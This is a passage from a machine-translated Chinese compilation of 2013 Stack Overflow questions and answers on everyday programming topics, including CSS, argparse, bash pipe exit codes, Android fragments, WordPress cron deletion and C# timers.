> 时间：2013-03-12T09:40:38.947

你可以`css`这样写：

```
.selectionContainer td
{
    width:100px;overflow:auto;
}
.selectionContainer th
{
    width:100px;overflow:auto;height:100px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:49:20.477

您可以将 scrollTop() 和 scrollLeft() 与 Jquery 一起使用；

```
$(yourTDdiv).scroll(function () { verthandlescrollbars(th, tdDiv, thDiv); });
$(yourTDdiv).scroll(function () { horihandlescrollbars(th, tdDiv, thDiv); });

function verthandlescrollbars(th ,thDiv, tdDiv){  
     if($(th).height() > 100){

        $(thDiv).scrollLeft($(tdDiv).scrollLeft());

      }
 }

function horihandlescrollbars(th, tdDiv, thDiv){
   //the same as verthandlescrollbars function!
   //$(thDiv).scrollTop 
} 
```

这应该是一个伪代码。

# html - 在 HTML 中声明根目录的区别

> ID：15357693
> 
> 赞同：5
> 
> 时间：2013-03-12T09:37:48.670
> 
> 标签：html, document-root

这个问题困扰了我很长时间，所以我需要问这个问题。

`/`和 和有什么区别`./`，是否仅取决于服务器设置？

例如，如果我们在根目录中寻找图像文件夹，我们会这样写：

`<img src="/images">`

但是，另一台服务器将只接受它，如下所示：

`<img src="./images">`

这不是什么大问题，但在一个理想的世界里，我想我可以相对容易地将我的网站转移到另一台服务器上，而不必更新这些小细节。

当然，我可以在 PHP 中声明它并在配置文件中设置一次，但它确实困扰着我。为什么有两种声明根的方法？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-12T09:38:37.670

要引用相对于当前页面的文件，您可以直接编写不带前缀的路径，也可以通过添加前缀来明确说明它`./`。要访问具有相对于站点根目录的路径的文件，请在路径前加上`/`.

## 概括

`/`绝对路径（从根目录到资源的完整路径）
`./`从当前目录到相对路径（等于不指定任何文件夹前缀）
`../`从父目录
`../../`到相对路径 从父级到父级的相对路径

## 例子

```
Current URL               Resource path          Resolves to

/pages/home.html          ./picture.jpg          /pages/picture.jpg
/pages/home.html          ../img/picture.jpg     /img/picture.jpg
/pages/about/home.html    /img/picture.jpg       /img/picture.jpg
/pages/about/home.html    img/picture.jpg        /pages/about/img/picture.jpg
/home.html                img/picture.jpg        /img/picture.jpg 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:38:41.780

仅当源页面（包含此 HTML 的页面）本身位于域的根时，这才是相同的。

一般情况下，`./images`等价于`images`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T10:30:42.273

这与 HTML 无关，除了 URL 也用于 HTML 的事实。这是在 URL 规范中定义的。简而言之，./ 是相对于当前的基本 URL，而 / 是相对于服务器根目录（从技术上讲，它指的是基本 URL 的服务器部分）。

# python - Python argparse - 使用子解析器和父级时未正确解析命令

> ID：15357694
> 
> 赞同：1
> 
> 时间：2013-03-12T09:37:51.663
> 
> 标签：python, command-line-arguments, argparse

在我的应用程序中，我有一个这样的解析器：

```
description = ("Cluster a matrix using bootstrap resampling or "
               "Bayesian hierarchical clustering.")
sub_description = ("Use these commands to cluster data depending on "
                   "the algorithm.")

parser = argparse.ArgumentParser(description=description, add_help=False)
subparsers = parser.add_subparsers(title="Sub-commands",
                                   description=sub_description)
parser.add_argument("--no-logfile", action="store_true", default=False,
                    help="Don't log to file, use stdout")
parser.add_argument("source", metavar="FILE",
                    help="Source data to cluster")
parser.add_argument("destination", metavar="FILE",
                     help="File name for clustering results") 
```

然后我添加了一系列像这样的子解析器（使用函数，因为它们很长）：

```
setup_pvclust_parser(subparsers, parser)
setup_native_parser(subparsers, parser) 
```

这些调用（以一个为例）：

```
def setup_pvclust_parser(subparser, parent=None):

    pvclust_description = ("Perform multiscale bootstrap resampling "
                           "(Shimodaira et al., 2002)")
    pvclust_commands = subparser.add_parser("bootstrap",
        description=pvclust_description, parents=[parent])
     pvclust_commands.add_argument("-b", "--boot", type=int,
                                   metavar="BOOT",
                                   help="Number of permutations",
                                   default=100)

    # Other long list of options...

    pvclust_commands.set_defaults(func=cluster_pvclust) # The function doing the processing 
```

问题是命令行的解析以某种方式失败，我确定这是我的错，在某个地方。运行时的示例：

```
 my_program.py bootstrap --boot 10 --no-logfile test.txt test.pdf

  my_program.py bootstrap: error: too few arguments 
```

好像解析有点错误。如果我在 subparser 调用中删除 parents=[] ，这种行为就会消失，但我宁愿避免它，因为它会产生大量重复。

编辑：在呼叫解决部分问题`subparsers`后移动呼叫。`add_argument`但是，现在解析器无法正确解析子命令：

```
my_program.py bootstrap --boot 100 --no-logfile test.txt test.pdf

my_program.py: error: invalid choice: 'test.txt' (choose from 'bootstrap', 'native') 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-25T06:39:05.440

根本问题是您将`parser`应该处理的参数与子解析器应该处理的参数混淆了。事实上，通过将解析器作为父级传递给子解析器，您最终会在两个地方定义这些参数。

此外`source`和`destination`是位置参数，子解析器也是如此。如果它们都在基本解析器中定义，那么它们的顺序很重要。

我建议定义一个单独的`parent`解析器

```
parent = argparse.ArgumentParser(add_help=False)
parent.add_argument("--no-logfile", action="store_true". help="...")
parent.add_argument("source", metavar="FILE", help="...")
parent.add_argument("destination", metavar="FILE", help="...")

parser = argparse.ArgumentParser(description=description)
subparsers = parser.add_subparsers(title="Sub-commands", description=sub_description)
setup_pvclust_parser(subparsers, parent)
setup_native_parser(subparsers, parent) 
```

# javascript - 消息：IE8 中的对象预期错误

> ID：15357695
> 
> 赞同：0
> 
> 时间：2013-03-12T09:37:53.493
> 
> 标签：javascript

我在 IE8 中收到对象预期错误。它在 chrome 和 FF 中运行良好。

实际上，javascript方法发生了错误。

供你参考，

```
function checkForm(idNum, varNum) { alert(234); }

//calling function here. 
checkForm(idNum, varNum); 
```

在这一行出现错误。

我在 document.ready 和选择框 onchange 事件中调用了这个方法。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:04:55.123

如果您正在使用，我假设您正在使用 jQuery `document.ready`？如在`$(document).ready()`

如果你是那么你想给`ready`一个函数，而不是调用一个函数

正如而不是拥有

```
$(document).ready(checkForm(idNum, varNum)); 
```

你会用

```
$(document).ready(function(){checkForm(idNum, varNum);}); 
```

`ready`只是一个函数，并且期望将一个对象传递给它，就像`checkForm`函数是一个对象一样，就像一个数字或字符串一样，并且可以传递给其他函数然后调用，就像这样......

```
function foo(bar){
    bar();
}

function foobar(){
    console.log("foobar has been called");
}

foobar();
foo(foobar); 
```

这个存在的输出

```
"foobar has been called"
"foobar has been called" 
```

如果我通过评论了解您在做什么...

# java - 带有弹性豆茎集群的 log4j

> ID：15357696
> 
> 赞同：3
> 
> 时间：2013-03-12T09:38:03.380
> 
> 标签：java, logging, amazon-elastic-beanstalk

我管理它通过 log4j 使用 apache commons 日志记录我的应用程序。

现在我可以将我的日志文件写入/var/log/whatever。我的问题是，如果豆茎扩大了怎么办？然后我有多个日志文件。假设我有 100 个实例，然后我有 100 个日志文件。当豆茎再次缩小时，我的日志文件会发生什么？

有没有一个灵魂，我不需要从每个节点下载每个日志文件，将它们放在一个地方？在 S3 上，即？

** 编辑 **

我想出了一种将每个实例的日志文件保存在 S3 实例上的方法。但这似乎不是一个好的解决方案，因为如果我必须搜索某些内容，那么搜索 100 个实例的日志是非常糟糕的。

知道如何将它们组合在一起吗？

# cordova - 如何在 API 级别 8 的移动设备上使用滚动

> ID：15357697
> 
> 赞同：0
> 
> 时间：2013-03-12T09:38:04.977
> 
> 标签：cordova

我正在开发在 API 级别 8 的移动设备上运行的 phonegap 应用程序。但我有一些问题。Html 代码如下。

```
...
<DIV id="ChList" data-role="content" style="height:230px; overflow:auto">   
... 
```

在 API 级别 16 上，“溢出：自动”成功使用，但在 API 级别 8 上，“溢出：自动”失败。请帮帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-03T21:27:44.113

使用 Qubic 的[iScroll](http://cubiq.org/iscroll-4)。不像应用 CSS 规则那么容易，但也不难。

# opencl - 是否可以使用不同的预处理器选项在 OpenCL 中构建相同的程序两次。

> ID：15357698
> 
> 赞同：0
> 
> 时间：2013-03-12T09:38:06.033
> 
> 标签：opencl

给定以下代码，其中 P 是加载了一些源代码的 cl_program。如果我跑步会发生什么

```
*err = clBuildProgram (p, 
                       1,
                       m_gpu_device_id,
                       str0,   // Compiler options, see the specifications for more details
                       0, 
                       0);

cl_kernel kernel0= clCreateKernel (p,   // The program where the kernel is
                        "nn_feedforward",   // The name of the kernel, i.e. the name of the kernel function as it's declared in the code
                        err);

*err = clBuildProgram (p,1,m_gpu_device_id, str1 ,0, 0);
cl_kernel kernel1 = clCreateKernel (p, "nn_feedforward", err); 
```

与使用 str0 选项的 kernel0 相比，kernel1 是否会使用 str1 的选项。或者第一个内核会以某种方式被覆盖。

# bash - 使用 glassfish 命令捕获 Bash 中的错误 [管道中的返回代码]

> ID：15357701
> 
> 赞同：0
> 
> 时间：2013-03-12T09:38:27.953
> 
> 标签：bash, glassfish, pipe

我正在编写一个 bash 脚本来管理对多个环境的 GF 服务器的部署。我想知道的是如何获得 GF 命令的结果，然后确定是继续还是退出。

例如

说我要重新部署，我有这个脚本

```
$GF_ASADMIN --port $GF_PORT redeploy --name  $EAR_FILE_NAME --keepstate=true $EAR_FILE | tee -a $LOG 
```

变量已经定义。因此，GF 将开始重新部署，要么成功要么失败。我想检查它是否这样做并采取相应的行动。我有这个。

```
RC=$?
if [[ $RC -eq 0 ]]; 
    then echoInfo "Application Successfully redeployed!" | tee -a $LOG; 
else
    echoError "Failed to redeploy application!"
    exit 1
fi; 
```

但是，它似乎并没有真正起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:42:24.043

问题是*管道*

```
$GF_ASADMIN ... | tee -a $LOG 
```

`$?`反映`tee`.

您正在寻找`PIPESTATUS`. 见`man bash`：

> 管道状态
> 
> 一个数组变量（请参阅下面的数组），其中包含最近执行的前台管道（可能仅包含一个命令）中进程的退出状态值列表。

另请参阅此示例以阐明`PIPESTATUS`

```
 false | true 
 echo ${PIPESTATUS[@]} 
```

输出是：`1 0`

更正后的代码是：

```
RC=${PIPESTATUS[0]} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:12:58.357

或者尝试使用代码块重定向，例如：

```
{
  if "$GF_ASADMIN" --port $GF_PORT redeploy --name  "$EAR_FILE_NAME" --keepstate=true "$EAR_FILE"
  then
    echo Info "Application Successfully redeployed!"
  else
    echo Error "Failed to redeploy application!" >&2
    exit 1
  fi
} | tee -a "$LOG" 
```

# php - phpbrowser和隐藏字段

> ID：15357703
> 
> 赞同：0
> 
> 时间：2013-03-12T09:38:29.867
> 
> 标签：php, unit-testing, testing, browser, automated-tests

我使用 phpbrowser 来测试我的脚本。当我试图设置隐藏字段的值时

```
$I->fillField('Billing[packageId]', "15"); 
```

它返回一个错误。有人可以帮助我如何解决问题吗？

截屏：![在此处输入图像描述](../Images/877a3feb314d6fb8ab1b965d522d3616.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T12:25:25.880

你可以发布表单html吗？您的表单中
似乎没有命名输入字段。`Billing[packageId]`

编辑：
您正在尝试填写一个名为`Billing[packageId]`但在您的代码中有`Billing[packageType]`.

另外，我认为这些`hidden`字段不应该填充用户输入，所以我不知道 phpBrowser 是否允许您这样做。

# java - Spring/Hibernate 相同的实体不同的数据库结构

> ID：15357709
> 
> 赞同：4
> 
> 时间：2013-03-12T09:38:48.600
> 
> 标签：java, sql, spring, hibernate, annotations

我有一个在 3 个不同国家/地区使用的应用程序。几乎都是一样的，除了一些国家/地区相关的例外情况，例如，订单在美国有 salesTax，但在英国没有。每个国家/地区都有自己的数据库，彼此完全独立，这些国家/地区特定属性的表结构略有不同。表名始终相同，所有国家/地区共享的列也是如此；只有额外的列使它们不同。

因此，目前我实际上有 3 个独立的应用程序，其中大约 80% 的代码相同。每次我开发一些东西时，我都需要将它复制到每个单独的应用程序中，这有点费力。

我的计划是尝试拥有一个全球应用程序，然后将其扩展到 3 个更小的国家特定的应用程序。

对于我的服务和 daos，这可以通过我的全局接口以及在本地应用程序之间变化的任何实现来处理。本地应用程序将作为依赖项引入全局。

但是，我的问题在于业务对象。再次以订单为例，我的许多服务和 daos 都使用 Order 对象，它们将是全球性的，因为代码在不同国家/地区是相同的。所以我需要某种 GLOBAL Order 对象。但我还想确保根据国家/地区的不同，如果我再次保存这些额外的属性，它们是否可用并持续存在。

例如，我有一个服务，它只检查订单的跟踪并将其标记为已交付。该服务是全球性的，因此可以访问 GLOBAL Order 对象。由于 orderDao 接口是全局的，它会调用 orderDao.getOrder(id)。orderDaoImpl 将是本地的，因此 getOrder(id) 方法实际上将返回一个本地化的 Order 实例，并带有额外的字段。当它通过层向上传递时，它再次到达跟踪服务，这需要一个 GLOBAL 订单，这意味着本地化字段不可用（这没关系，因为这个 trackingService 不关心它们，如果它关心它们，则实现将本地化）。

当我更新这个全球订单的状态时，我需要确保当它被保存时，本地化的属性不会丢失。

所以我最大的问题是我怎样才能完成这项工作？

**选项 1：** 我有什么方法可以定义一些“选择性瞬态”？所以我有一个具有所有可能属性的 Java 对象。在每个应用程序中使用它时，如果数据库表中不存在这些属性中的任何一个，则忽略它并继续。

**或者**

**选项2：** 我有没有办法使用一些可以在全局和本地级别使用的抽象/接口类，本地应用程序会自动将对象转换为实现的子类？

值得指出的是，GLOBAL 应用程序本身永远不会真正运行，它只会在本地应用程序中使用。但显然不能引用本地类。

为任何帮助而欢呼。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:51:55.137

可能不是最优雅的解决方案，但您可以创建一个未映射为的全局订单类，`@Entity`并将其包含在您的区域订单中`@Embedded`

```
class GlobalOrder {
    @Column(name = "total")
    private Integer orderTotal;
    ...
}

@Entity
@Table("emeaorder")
class EMEAOrder {
    @Embedded
    private GlobalOrder globalOrder;
    @Column(name = "tax")
    private Integer euSalesTax;
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T08:50:26.617

好的。我想我已经想出了最不优雅但可行的解决方案。

问题是允许我的全球应用程序了解本地业务对象（例如订单），但没有将它们映射到每个国家/地区可能不存在的列。

因此，我已将它们包含在我的 Global 项目中，并包含了所有可能的属性和 getter/setter。

然后，我还将它们包含在我的本地项目中，仅包含该特定国家所需的字段。

由于全局应用程序本身从未真正使用过，因此每当我使用 maven 构建库时，我都会排除本地项目中的任何业务对象。因此，当本地将其作为依赖项包含在内时，没有冲突，并且仅包含这些对象的本地版本，这意味着 Hibernate 不会抱怨缺少列。

不干净，但它有效！

# c++ - 将 PJSIP 与 Windows 的视频支持一起使用

> ID：15357710
> 
> 赞同：0
> 
> 时间：2013-03-12T09:38:48.960
> 
> 标签：c++, winapi, sdl, directshow, pjsip

我想将 PJSIP 与 Windows 程序 (Win32/MFC/C++) 的视频支持一起使用。通过查看 PJSIP 项目的站点（[http://trac.pjsip.org/repos/wiki/Getting-Started/Windows](http://trac.pjsip.org/repos/wiki/Getting-Started/Windows)），我看到了其他（附加要求）：

*   DirectShow SDK，包含在 Windows SDK 中。
*   SDL 2.0 版或 1.3 版

在这种情况下，我需要在 config_site.h 中进行以下配置：

```
#define PJMEDIA_HAS_VIDEO               1
#define PJMEDIA_HAS_FFMPEG              1
#define PJMEDIA_VIDEO_DEV_HAS_SDL       1
#define PJMEDIA_VIDEO_DEV_HAS_DSHOW     1 
```

如果我将这两个组件添加到我的 PJSIP 项目中，一切正常，我会收到有关来电的通知，并且可以显示/捕捉门上摄像头的视频。

我的问题：对于 Windows 程序，我真的需要这两个组件（SDL 和 DirectX/DirectShow）吗？这意味着，我是否必须需要 SDL（我想不需要），如果是，我是否还需要 DirectX？为什么我不能在 Windows 上使用 OpenGL？也许有人有这个主题的经验 - 我会很感激你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T16:57:17.390

你肯定需要 DirectShow。对需要 SDL 持否定态度...

DirectShow 为 Windows 中的视频捕获源提供流接口。尽管 DirectShow 本身主要是一组用户模式组件，但提供的视频捕获过滤器（通常是 KsProxy.ax）通过一组定义的接口和属性与内核级捕获驱动程序进行通信。一些相机制造商选择为他们自己的用户模式 ​​DirectShow 捕捉过滤器提供私有（通常是内核）接口到他们的硬件，这使得 DirectShow 成为所有 Windows 视频捕捉设备的公共访问点。

SDL 提供了一个跨平台库，可以快速访问显示。PJSIP 中的编解码器使用它来将解码的视频发送到显示器。

看起来 PJSIP*可能*支持使用 DirectShow 作为渲染过滤器。见： [http ://svn.pjsip.org/repos/pjproject/trunk/pjmedia/src/pjmedia-videodev/dshow_dev.c](http://svn.pjsip.org/repos/pjproject/trunk/pjmedia/src/pjmedia-videodev/dshow_dev.c)

从源代码中不清楚如果启用第 52 行的 DirectShow 渲染器的代码是否会起作用：

```
/* Temporarily disable DirectShow renderer (VMR) */
#define HAS_VMR         0 
```

由于这已被注释掉，我会假设代码没有完全完成，这就是所有示例也需要 SDL 的原因。

# css - 是否有在流体模式下使用 Zurb Foundation 网格的最佳实践？

> ID：15357711
> 
> 赞同：2
> 
> 时间：2013-03-12T09:38:50.973
> 
> 标签：css, zurb-foundation

使用 Zurb Foundation 4 提供了小网格（用于 768 像素以下的屏幕）和大网格以及从 .show/hide-for-small 到 .show/hide-for-xlarge 的各种可见性类。

开发流畅的、非固定宽度的布局，开发人员可以根据屏幕大小选择使用网格或显示/隐藏 dom 元素。对于某些星座（例如，当屏幕尺寸减小时从四列布局切换到三列布局），可能需要更复杂的测量。示例可以是底层 dom 元素的结构转换或复制实际内容以及根据屏幕大小显示/隐藏相关结构。

我的问题是什么/是否有在流体模式下使用 Zurb Foundation 网格的最佳实践？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-08T17:54:07.307

我不确定您所说的 Zurb Foundation 中的流体模式是什么意思。

关于从 4 列布局到 3 列布局从大到移动的切换，我一直只是将可见性类放在行中。

```
<div class="row hide-for-small">
  <div class="large-3 columns"></div>
  <div class="large-3 columns"></div>
  <div class="large-3 columns"></div>
  <div class="large-3 columns"></div>
</div>

<div class="row hide-for-medium-up">
  <div class="small-4 columns"></div>
  <div class="small-4 columns"></div>
  <div class="small-4 columns"></div>
</div> 
```

否则，正常行为是堆叠。您可以从 4 列转到 3 列，然后将其中一列拉伸 12 宽，如下所示：

```
<div class="row">
  <div class="large-3 small-4 columns">Lorem ipsum dolor sit amet.</div>
  <div class="large-3 small-4 columns">Eius, ex vitae consequuntur nulla!</div>
  <div class="large-3 small-4 columns">Ipsam, assumenda ex non architecto.</div>
  <div class="large-3 small-12 columns">Tempore ipsa provident deserunt vel.</div>
</div> 
```

或者

```
<div class="row">
  <div class="large-3 small-12 columns">Tempore ipsa provident deserunt vel.</div>
  <div class="large-3 small-4 columns">Lorem ipsum dolor sit amet.</div>
  <div class="large-3 small-4 columns">Eius, ex vitae consequuntur nulla!</div>
  <div class="large-3 small-4 columns">Ipsam, assumenda ex non architecto.</div>
</div> 
```

# php - Wordpress：如何自动删除具有特定内容的帖子

> ID：15357716
> 
> 赞同：0
> 
> 时间：2013-03-12T09:39:08.897
> 
> 标签：php, cron, wordpress

我想使用 WP-Crontrol 自动删除具有特定内容的 Wordpress 帖子（或者可能是我还不知道的更好的解决方案）。我添加了以下 cron 作业，但它没有做任何事情：

```
global $wpdb;
$result = $wpdb->get_results( "SELECT ID FROM wp_posts WHERE post_content LIKE 'Content which should result in a deletion of this post'" );
  if ($result){
    foreach($result as $pageThing){
      wp_delete_post($pageThing);
    }
  } 
```

我怎样才能让它工作？谢谢

[http://wordpress.org/extend/plugins/wp-crontrol/](http://wordpress.org/extend/plugins/wp-crontrol/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:03:34.093

您需要`require_once('absolute-path/wp-load.php')`在 cron 脚本的顶部然后运行您的脚本。您现在拥有的应该可以工作。

# java - 为什么我编译的类有它的方法局部变量重命名？

> ID：15357717
> 
> 赞同：6
> 
> 时间：2013-03-12T09:39:23.680
> 
> 标签：java, javac

我有一个`Kitchen.jar`文件。我需要修改其中的一个类。我用[JD](http://java.decompiler.free.fr/)反编译它。然后我修改`Toster.java`文件并编译它：

```
javac -classpath . Toster.java 
```

然后我把它带回`Kitchen.jar`：

```
jar -uf Kitchen.jar Toster.class 
```

除一个问题外，所有工作。`Kitchen.jar`当我在[JD](http://java.decompiler.free.fr/)中打开更新时，我看到所有方法中的局部变量都重命名为`localLongVar`. 为什么？

我问的原因是因为`Kitchen.jar`修改后拒绝工作。而且我怀疑它必须是编译问题。也许我滥用了一些标志或任何东西。没有把握。除了基本语法外，我对Java一无所知。

我的猜测是我用最新的 1.7 版本编译它，而原始 jar 是用旧的 JDK 编译的。这可能解释了操作失败，但这并不能解释本地人的重命名。

## 例子

原始 jar 中的随机行：

```
BigInteger[] result = new BigInteger[bis.length / 2]; 
```

和我班的同一行：

```
BigInteger[] arrayOfBigInteger1 = new BigInteger[paramArrayOfBigInteger.length * 2]; 
```

所以它`result`与`arrayOfBigInteger1`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:42:48.653

默认情况下，javac 会删除除源文件和行号之外的调试信息。`javac -g`用or编译`javac -g:vars`。

来自[javac 的文档](http://docs.oracle.com/javase/6/docs/technotes/tools/windows/javac.html)

> `-g` 生成所有调试信息，包括局部变量。默认情况下，只生成行号和源文件信息。
> 
> `-g:none`不要生成任何调试信息。
> 
> `-g:{keyword list}`仅生成某些类型的调试信息，由逗号分隔的关键字列表指定。有效的关键字是：
> 
> `source`源文件调试信息
> 
> `lines`行号调试信息
> 
> `vars`局部变量调试信息

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T09:42:48.583

变量的名称不会保留在编译的代码中。最明显的是减少编译类的大小。编译器将用较短的名称替换它们。这样做也有利于混淆代码，以便反编译代码的人难以理解逻辑。`localLongVar`您在 JD 中看到的是编译器对替换的变量名所做的。

# android - Android 片段与之前的视图和按钮侦听器重叠

> ID：15357721
> 
> 赞同：1
> 
> 时间：2013-03-12T09:39:42.910
> 
> 标签：android, android-fragments

我有一个活动 A，里面有一个片段 A。

Activity A 使用布局 X，片段 A 使用布局 A。

布局 X 的代码：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
tools:context=".MainActivity" >

<fragment
    android:id="@+id/fragment1"
    android:name="android.app.DialogFragment"
    android:layout_width="wrap_content"
    android:layout_height="500dp"
    android:layout_alignParentTop="true"
    android:layout_centerHorizontal="true"
    android:layout_marginTop="113dp"
    class="com.example.fragtester.FragA" />

</RelativeLayout> 
```

布局 A 就是 textview + linearlayout。

我设置了另一个使用布局 B 的片段 B。

现在我在活动 A 中使用以下代码来更改片段：

```
Fragment f = new FragB();
FragmentTransaction ft = getFragmentManager().beginTransaction();
ft.replace(R.id.fragment1, f);
ft.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
ft.addToBackStack(null); 
ft.commit(); 
```

我最终将布局 B 显示在布局 A 下。

所以我使用 FrameLayout 将片段包装在布局 X 中并使用

```
ft.replace(R.id.FrameLayout1, f); 
```

现在视图运行良好。然而，另一个问题出现了。

虽然布局 B 覆盖了布局 A，但按钮仍然处于活动状态。

这意味着当我查看布局 B 时，我仍然可以单击布局 A 上的按钮，即使我没有看到它。

即使我添加片段 C/D/E.....（布局 C/D/E....），布局 A 上的按钮仍然处于活动状态。

谁能解释这是为什么？我是否错误地使用了片段？谢谢！

一种打通的方法是将布局A留空，并使用其他布局覆盖它。但这似乎不是“正确”的方式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T10:07:28.640

移除片段并添加 FrameLayout

```
 <FrameLayout
        android:id="@+id/fragment_container"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="#ffffff" >
    </FrameLayout> 
```

然后以编程方式添加片段。

在 android 片段按钮中单击通过片段（我不知道片段是否应该像那样工作）。我以前在这种情况下所做的就是使片段的布局可点击。所以点击不会通过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-17T00:19:52.637

将以下属性添加到顶部片段的 XML 根布局。

```
android:clickable="true" 
```

这将确保触摸事件不会传播到比顶层更远的地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:52:26.587

尝试为片段创建空容器，而不是在您的 xml 中包含片段。例如空框架布局。然后以编程方式将你的片段放在那里。

# jquery-ui - Jquery自动完成在表的多个列中进行搜索

> ID：15357723
> 
> 赞同：1
> 
> 时间：2013-03-12T09:39:48.693
> 
> 标签：jquery-ui, jquery-ui-autocomplete

[Jquery UI 的自动完成功能](http://api.jqueryui.com/autocomplete/) 提供了通过表格的一列进行搜索的解决方案。因此，如果您从带有名字字段的表中获取源，那么您只能使用名字进行搜索。

但是假设您有多个字段可供搜索，例如名字、姓氏、邮政编码、联系人号码。那么在那种情况下，你将如何为自动建议实现这样的东西。

我的意思是用户应该能够使用他们喜欢的任何字段进行搜索，并且自动建议应该能够基于此向他们提供建议。

这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:43:41.330

源可以是数组、字符串或函数。

您必须编写一个自定义函数来读取表的所有列中的所有值并将它们存储在一个数组中。`.source`然后使用您的数组调用该方法。

对于奖励积分，搜索字段上方的一系列复选框将要求用户仅搜索这些列。

```
[ ] FirstName   [X] Lastname   [X] Department
_Smith_____
John   Smith    IT
Waylon Smithers Assistant to the Assistant Regional Manager
Jackie Brown    Gunsmith 
```

# ajax - Codeigniter 控制器检测 ajax 文件上传

> ID：15357726
> 
> 赞同：0
> 
> 时间：2013-03-12T09:39:56.560
> 
> 标签：ajax, codeigniter, file-upload

我已经设置了我的 Codeigniter 应用程序，以便我可以通过 Ajax 上传文件。我按照本教程[http://net.tutsplus.com/tutorials/javascript-ajax/how-to-upload-files-with-codeigniter-and-ajax/](http://net.tutsplus.com/tutorials/javascript-ajax/how-to-upload-files-with-codeigniter-and-ajax/)

我的原始表单检查了是否调用了 ajax 请求，如果没有，则显示回退 CI 表单验证/错误消息。

我检查了这个使用 -`$this->input->is_ajax_request()`

我的代码如下所示：

```
if($this->input->is_ajax_request()){
   // process ajax form data
} else {
   if($this->form_validation->run() == FALSE) { 
      $data['success'] = 0;
      $data['errors'] = validation_errors();
   } else {
      $data['success'] = 1;
   }
   $this->load->view('form', $data);
} 
```

在做了一些调查之后，我发现我不能应用相同的技术，因为它实际上不是一个 ajax 请求，因此我不确定如何使用这种方法。如果有人能指出我正确的方向，那就太好了。我不喜欢它完全依赖 ajax，我喜欢有一个后备选项。我在评论中注意到有人在他们的 ajaxfileupload.js 中设置了 CSFR cookie，但老实说，我对 js 不太感兴趣，所以我不知道从哪里开始。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:46:45.037

在您的 AJAX 请求以及您可以发布键/值的所有其他内容中：

```
ajax : 1 
```

然后在你的控制器中：

```
if( $this->input->post('ajax') == 1 ) {
  // process ajax form data
}
else
{
  // form validation
} 
```

希望这可以帮助。

# django - REST API 文档

> ID：15357729
> 
> 赞同：0
> 
> 时间：2013-03-12T09:40:04.563
> 
> 标签：django, django-rest-framework

我是 django-rest-framework 的新手。我想知道这个模块是否为用户提供了他的 API 的自我生成文档。我的意思是，如果 drf 提供了一个页面，我将在该页面上列出我的所有 api 方法（具有所需的权限、参数、url 和描述）？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T10:16:35.313

看一下`django-rest-framework-docs`包装：

[https://github.com/marcgibbons/django-rest-framework-docs](https://github.com/marcgibbons/django-rest-framework-docs)

也是同一作者的较新`django-rest-swagger`软件包：

[https://github.com/marcgibbons/django-rest-swagger](https://github.com/marcgibbons/django-rest-swagger)

# c# - 我如何在 C# 中等待一段时间（Windows 服务）

> ID：15357731
> 
> 赞同：4
> 
> 时间：2013-03-12T09:40:09.943
> 
> 标签：c#, service, wait

我在 C# 上创建了 Windows 服务。现在我有扫描数据库的方法。我需要每分钟调用此方法两次。其实我不知道在 Windows 服务中等待的方法。我试过 Thread.Sleep ......但什么也没发生。请帮我解决这个问题。

```
private int wait;
protected void Start()
{
    wait = 1000;
    while (true)
    {
        if (wait < 30000)
            wait += wait;

        //implement logic for waiting

        Video video = new Video();
        video.FindFileForConvert();
        if (video.Path != null)
        {
            Console.WriteLine("video != null. video path = {0}", video.Path);
            video.BeginConvertation();
            video.DeleteOriginFile();
            wait = 1000;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:42:55.137

您应该使用[System.Threading.Timer](http://msdn.microsoft.com/en-us/library/system.threading.timer.aspx)相同。因为`Thread.sleep`至少在某些情况下不是一个好习惯。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:43:40.177

您可以使用[计时器](http://msdn.microsoft.com/en-us/library/xdh6857z.aspx)

```
public static int Main() {
   /* Adds the event and the event handler for the method that will 
      process the timer event to the timer. */
   myTimer.Tick += new EventHandler(TimerEventProcessor);

   // Sets the timer interval to 5 seconds.
   myTimer.Interval = 5000;
   myTimer.Start();

   // Runs the timer, and raises the event. 
   while(exitFlag == false) {
      // Processes all the events in the queue.
      Application.DoEvents();
   }
return 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T10:04:22.130

我可能弄错了，但我认为这段代码可以帮助您解决问题。[调度器定时器](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatchertimer.aspx "调度器定时器")

```
DispatcherTimer dispathcerTimer = new DispatcherTimer();
dispathcerTimer.Interval = TimeSpan.FromMinutes(2);
dispathcerTimer.Tick += dispathcerTimer_Tick;
dispathcerTimer.Start();

